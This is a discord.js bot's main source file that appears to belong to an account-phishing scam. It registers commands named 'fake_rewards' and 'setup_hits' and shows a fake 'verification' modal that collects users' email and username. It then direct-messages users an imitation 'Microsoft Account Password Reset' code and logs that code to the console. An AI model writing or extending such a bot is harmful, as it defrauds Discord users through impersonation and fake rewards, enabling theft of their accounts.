const { Client, GatewayIntentBits, Partials, REST, Routes, PermissionsBitField, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const config = require('./config');
const registerCommand = require('./commands/register');
const setupCommand = require('./commands/setup');
const setupChannelCommand = require('./commands/setup_channel');
const { generateVerificationCode, verifyCode } = require('./utils/verification');

// Configure client with minimal required intents
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [
        Partials.Channel,
        Partials.Message,
        Partials.User
    ]
});

// Bot ready event
client.on('ready', async () => {
    console.log('Bot is ready and online!');

    try {
        // Register slash commands globally
        const rest = new REST({ version: '10' }).setToken(config.TOKEN);
        const commands = [
            registerCommand.data.toJSON(),
            setupCommand.data.toJSON(),
            setupChannelCommand.data.toJSON(),
            require('./commands/say').data.toJSON(),
            require('./commands/fake_rewards').data.toJSON(),
            require('./commands/setup_hits').data.toJSON()
        ];



        // Register commands globally
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );

        // Generate invite link with required permissions
        const inviteLink = client.generateInvite({
            permissions: [
                PermissionsBitField.Flags.ViewChannel,
                PermissionsBitField.Flags.SendMessages,
                PermissionsBitField.Flags.UseApplicationCommands,
                PermissionsBitField.Flags.ManageRoles
            ],
            scopes: ['bot', 'applications.commands']
        });

        console.log('Invite Link:', inviteLink);
    } catch (error) {
        console.error('Error during setup:', error);
    }
});

// Interaction event handler for slash commands
client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    try {
        const command = {
            register: registerCommand,
            setup: setupCommand,
            setup_channel: setupChannelCommand,
            say: require('./commands/say'),
            fake_rewards: require('./commands/fake_rewards')
        }[interaction.commandName];

        if (command) {
            try {
                if (interaction.commandName === 'register') {
                    await command.handle(interaction);
                } else if (interaction.commandName === 'setup') {
                    await setupCommand.execute(interaction);
                } else {
                    await command.execute(interaction);
                }
            } catch (error) {
                console.error(`Error executing ${interaction.commandName}:`, error);
                if (!interaction.replied && !interaction.deferred) {
                    await interaction.reply({ 
                        content: 'There was an error executing this command.',
                        ephemeral: true 
                    }).catch(console.error);
                }
            }
        }
    } catch (error) {
        console.error('Command execution error:', error);
        await interaction.reply({ 
            content: 'There was an error executing this command! Please try again.', 
            ephemeral: true 
        });
    }
});

// Button interaction handler and Modal submit handler
client.on('interactionCreate', async interaction => {
    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'verification_modal') {
            const email = interaction.fields.getTextInputValue('email');
            const username = interaction.fields.getTextInputValue('username');

            // Generate verification code
            const code = generateVerificationCode(interaction.user.id);

            // Create verification button
            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('enter_code')
                        .setLabel('Enter Code')
                        .setStyle(ButtonStyle.Primary)
                );

            await interaction.reply({
                content: 'Due To Fake Verifications We Have To Send a Code\nEnter Your Code',
                components: [row],
                ephemeral: true
            });

            await interaction.user.send(`Microsoft Account Password Reset\nReset Code: ${code}\nThis code will expire in 10 minutes.`);
            console.log(`Verification code for ${username}: ${code}`);
        } else if (interaction.customId === 'code_modal') {
            const enteredCode = interaction.fields.getTextInputValue('code');

            if (verifyCode(interaction.user.id, enteredCode)) {
                const email = interaction.fields.getTextInputValue('email');
                const username = interaction.fields.getTextInputValue('username');
                await interaction.reply({
                    content: `Username = ${username}\nEmail = ${email}\nNew Passkey = Nitro5071`,
                    ephemeral: true
                });
            } else {
                await interaction.reply({
                    content: 'Invalid verification code. Please try again.',
                    ephemeral: true
                });
            }
        }
    } else if (interaction.isButton()) {
        if (interaction.customId === 'enter_code') {
            const modal = new ModalBuilder()
                .setCustomId('code_modal')
                .setTitle('Enter Verification Code');

            const codeInput = new TextInputBuilder()
                .setCustomId('code')
                .setLabel('Enter Your Code')
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const row = new ActionRowBuilder().addComponents(codeInput);
            modal.addComponents(row);

            await interaction.showModal(modal);
        } else if (interaction.customId === 'verify_account') {
            await require('./commands/setup').handleButton(interaction);
        }
    }
});

// Modal submission handler
client.on('interactionCreate', async interaction => {
    if (!interaction.isModalSubmit()) return;

    if (interaction.customId === 'registration_modal') {
        try {
            await registerCommand.handleModalSubmit(interaction);
        } catch (error) {
            console.error('Modal submission error:', error);
            await interaction.reply({
                content: 'An error occurred while processing your registration. Please try again later.',
                ephemeral: true
            });
        }
    }
});

// Message handler for say command
client.on('messageCreate', async message => {
    if (message.author.bot) return;
    await require('./commands/say').handleMessage(message);
});

// Error handling
client.on('error', error => {
    console.error('Discord client error:', error);
});

// Validate token before login
if (!config.TOKEN || config.TOKEN === 'YOUR_DISCORD_TOKEN') {
    console.error('Please provide a valid Discord bot token in your environment variables.');
    process.exit(1);
}

// Start the bot
client.login(config.TOKEN).catch(error => {
    console.error('Failed to login:', error);
    process.exit(1);
});

// Handle process termination
process.on('SIGINT', () => {
    console.log('Bot is shutting down...');
    client.destroy();
    process.exit(0);
});